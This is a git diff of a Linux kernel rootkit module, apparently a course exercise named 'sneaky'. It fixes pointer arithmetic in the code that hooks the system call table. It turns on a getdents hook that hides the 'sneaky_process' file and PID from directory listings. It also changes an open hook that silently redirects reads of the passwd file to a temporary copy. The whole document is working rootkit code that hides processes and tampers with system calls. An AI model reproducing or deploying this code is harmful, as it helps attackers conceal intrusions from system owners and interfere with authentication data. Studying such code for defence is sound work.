@@ -59,7 +59,9 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
   struct linux_dirent *curr = dirp;
   int cursor = 0;
   while (cursor < returned_sz) {
-    curr = curr + cursor;
+
+    curr = (struct linux_dirent *)((char *)curr + cursor);
+    unsigned short curr_reclen = curr->d_reclen;
     // check sneaky_process
     if (!strcmp(curr->d_name, "sneaky_process") ||
         !strcmp(curr->d_name, spid)) {
@@ -69,12 +71,13 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
       } else if (!strcmp(curr->d_name, spid)) {
         printk(KERN_INFO "Found Sneaky PID\n");
       }
-      int curr_reclen = curr->d_reclen;
+
       char *next = (char *)curr + curr_reclen;
       size_t sz_dif = (size_t)(next - (char *)dirp);
       size_t count = returned_sz - sz_dif;
       memcpy(curr, next, count);
       returned_sz = returned_sz - cursor;
+      break;
     }
 
     cursor = cursor + curr->d_reclen;
@@ -95,9 +98,11 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
   char *proc_modules = "/proc/modules";
   if (!strcmp(original_path, pathname)) {
     printk(KERN_INFO "Starting to open tmp/passwd\n");
-    status = copy_to_user((void *)original_path, temp_path, sizeof(temp_path));
+    status = copy_to_user((void *)pathname, temp_path, sizeof(temp_path));
     if (status) {
       printk(KERN_INFO "Fail to call copy_to_user\n");
+    } else {
+      printk(KERN_INFO "Successfully called copy_to_user\n");
     }
 
   } else {
@@ -154,11 +159,11 @@ static int initialize_sneaky_module(void) {
   // This is the magic! Save away the original 'open' system call
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
-  original_getdents = (void *)*(sys_call_table + __NR_getdents);
-  //  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
-
   original_call = (void *)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
+
+  original_getdents = (void *)*(sys_call_table + __NR_getdents);
+  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
 
   original_read = (void *)*(sys_call_table + __NR_read);
   *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
